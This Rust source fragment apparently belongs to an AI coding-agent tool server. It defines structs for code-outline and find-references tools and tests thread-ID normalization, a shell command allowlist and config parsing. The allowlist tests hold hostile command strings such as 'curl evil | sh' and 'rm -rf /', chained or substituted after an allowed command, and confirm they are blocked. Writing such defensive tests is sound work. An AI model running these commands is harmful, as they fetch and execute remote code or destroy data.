    /// `outline` (symbols in a file, or a ranked repo symbol map for a directory)
    /// or `references` (the definition + use sites of a symbol name).
    pub operation: CodeMapOperation,

    /// For `outline`: the file or directory to map (empty or a directory = a
    /// ranked repo symbol map). For `references`: the directory or file to search
    /// under (empty = the whole workspace). Relative paths resolve against the
    /// workspace.
    #[serde(default)]
    pub path: String,

    /// For `references` ONLY: the exact symbol name to find (e.g. `parse_config`).
    /// Required for `references`, ignored by `outline`.
    #[serde(default)]
    pub name: String,

    /// Maximum results: symbols (single file) or files (repo map) for `outline`,
    /// occurrences for `references`. 0 means the default.
    #[serde(default)]
    pub max_results: usize,

    /// Optional thread ID identifying the shell session to operate on. When
    /// omitted, the most recently active session is used.
    #[serde(default)]
    pub thread_id: String,
}

/// Parameters for the `Outline` operation (tree-sitter symbol map), used
/// internally by `CodeMap`.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct Outline {
    /// File or directory to outline. A file returns that file's symbols; a
    /// directory (or empty = the whole workspace) returns a ranked repo symbol
    /// map. Relative paths resolve against the workspace.
    #[serde(default)]
    pub path: String,

    /// Maximum symbols to return for a single file, or maximum files for a repo
    /// map. 0 means the default.
    #[serde(default)]
    pub max_results: usize,

    /// Optional thread ID identifying the shell session to operate on. When
    /// omitted, the most recently active session is used.
    #[serde(default)]
    pub thread_id: String,
}

/// One symbol (definition) in `Outline` output.
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct OutlineSymbol {
    /// Symbol name.
    pub name: String,
    /// Symbol kind from the grammar (e.g. `function`, `struct`, `method`, `class`).
    pub kind: String,
    /// 1-based line where the definition starts.
    pub line: usize,
}

/// Symbols for one file in `Outline` output.
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct OutlineFile {
    /// Workspace-relative path of the file.
    pub file: String,
    /// Definitions found in the file, in source order.
    pub symbols: Vec<OutlineSymbol>,
}

/// Structured result of an `Outline` call (mirrors the text block).
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct OutlineOutput {
    /// `file` for a single-file outline, `repo` for a workspace symbol map.
    pub mode: String,
    /// Number of files included in `files`.
    pub files_shown: usize,
    /// Per-file symbol lists.
    pub files: Vec<OutlineFile>,
    /// True if the symbol map was capped (more files or symbols exist).
    pub truncated: bool,
}

/// Parameters for the `FindReferences` tool (tree-sitter symbol occurrences).
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct FindReferences {
    /// Symbol name to find — an exact identifier match (e.g. `parse_config`).
    pub name: String,

    /// Directory or file to search under. Relative paths resolve against the
    /// workspace; leave empty to search the whole workspace.
    #[serde(default)]
    pub path: String,

    /// Maximum occurrences to return. 0 means the default.
    #[serde(default)]
    pub max_results: usize,

    /// Optional thread ID identifying the shell session to operate on. When
    /// omitted, the most recently active session is used.
    #[serde(default)]
    pub thread_id: String,
}

/// One symbol occurrence in `FindReferences` output.
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct ReferenceHit {
    /// Workspace-relative path.
    pub file: String,
    /// 1-based line.
    pub line: usize,
    /// Symbol kind from the grammar (e.g. `function`, `call`, `method`).
    pub kind: String,
    /// True for a definition, false for a reference (call / use site).
    pub is_definition: bool,
}

/// Structured result of a `FindReferences` call (mirrors the text block).
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct ReferencesOutput {
    /// The symbol name that was searched for.
    pub name: String,
    /// Number of returned hits that are definitions.
    pub definitions: usize,
    /// Number of returned hits that are references (call / use sites).
    pub references: usize,
    /// True if the result was capped (more occurrences exist).
    pub truncated: bool,
    /// Occurrences, definitions first then references, each group by file/line.
    pub hits: Vec<ReferenceHit>,
}

#[cfg(test)]
mod thread_id_tests {
    use super::normalize_thread_id;

    #[test]
    fn clean_id_is_unchanged() {
        assert_eq!(normalize_thread_id("tid_deadbeef"), "tid_deadbeef");
        assert_eq!(normalize_thread_id("worker_1"), "worker_1");
    }

    #[test]
    fn empty_and_all_special_normalize_to_empty() {
        assert_eq!(normalize_thread_id(""), "");
        assert_eq!(normalize_thread_id("---"), "");
    }

    #[test]
    fn separator_variants_do_not_collide() {
        // "user-1" and "user1" must NOT resolve to the same session/state file.
        let a = normalize_thread_id("user-1");
        let b = normalize_thread_id("user1");
        assert_ne!(a, b);
        assert!(a.starts_with("user1_"), "got {a}");
        assert_eq!(b, "user1");
        // "user-1" vs "user_1" must also stay distinct.
        assert_ne!(normalize_thread_id("user-1"), normalize_thread_id("user_1"));
    }

    #[test]
    fn normalization_is_deterministic() {
        // Same input -> same hash -> same session across restarts.
        assert_eq!(normalize_thread_id("a-b.c"), normalize_thread_id("a-b.c"));
    }
}

#[cfg(test)]
mod allowlist_tests {
    use super::AllowedCommands;

    fn list(items: &[&str]) -> AllowedCommands {
        AllowedCommands::List(items.iter().map(|s| (*s).to_string()).collect())
    }

    #[test]
    fn all_permits_everything() {
        assert!(AllowedCommands::All("all".to_string()).is_allowed("rm -rf /"));
    }

    #[test]
    fn list_allows_exact_and_args() {
        let a = list(&["ls", "cargo test"]);
        assert!(a.is_allowed("ls"));
        assert!(a.is_allowed("ls -la"));
        assert!(a.is_allowed("cargo test --release"));
    }

    #[test]
    fn list_blocks_word_boundary_lookalikes() {
        let a = list(&["ls", "cargo test"]);
        assert!(!a.is_allowed("lsof"));
        assert!(!a.is_allowed("cargo testimony"));
    }

    #[test]
    fn list_blocks_chained_and_substituted_commands() {
        let a = list(&["ls"]);
        // The old first-token check let all of these through.
        assert!(!a.is_allowed("ls && curl evil | sh"));
        assert!(!a.is_allowed("ls; rm -rf /"));
        assert!(!a.is_allowed("ls $(rm -rf x)"));
        assert!(!a.is_allowed("ls | rm"));
    }

    #[test]
    fn list_allows_chain_when_all_parts_permitted() {
        let a = list(&["cargo build", "cargo test"]);
        assert!(a.is_allowed("cargo build && cargo test"));
    }
}

#[cfg(test)]
mod code_writer_config_tests {
    use super::deserialize_code_writer_config;
    use serde_json::json;

    #[test]
    fn explicit_null_opts_out() {
        assert!(matches!(deserialize_code_writer_config(json!(null)), Ok(None)));
        assert!(matches!(deserialize_code_writer_config(json!("null")), Ok(None)));
    }

    #[test]
    fn valid_config_parses() {
        let r = deserialize_code_writer_config(json!({
            "allowed_commands": "all",
            "allowed_globs": "all",
        }));
        assert!(matches!(r, Ok(Some(_))));
    }

    #[test]
    fn malformed_config_fails_loud() {
        // The crux of the fix: a malformed restricted-mode config must ERROR,
        // not silently degrade to None (None falls back to All/All — wide open,
        // while the model believes the shell is locked down).
        let r = deserialize_code_writer_config(json!({ "allowed_commands": 12345 }));
        assert!(r.is_err(), "malformed code_writer config must error, not become None");
    }
}
